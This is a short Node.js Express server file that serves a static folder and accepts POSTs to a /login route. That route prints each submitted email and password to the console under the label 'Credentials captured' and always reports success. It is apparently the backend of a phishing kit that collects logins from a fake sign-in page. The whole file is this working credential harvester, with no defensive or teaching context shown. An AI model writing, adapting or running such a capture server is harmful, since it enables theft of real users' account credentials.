const express = require('express');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/login', (req, res) => {
    console.log('[+] Request body:', req.body);
    const { email, password } = req.body;
    console.log(`[+] Credentials captured: ${email} | ${password}`);
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`[+] Server running on http://localhost:${PORT}`);
});
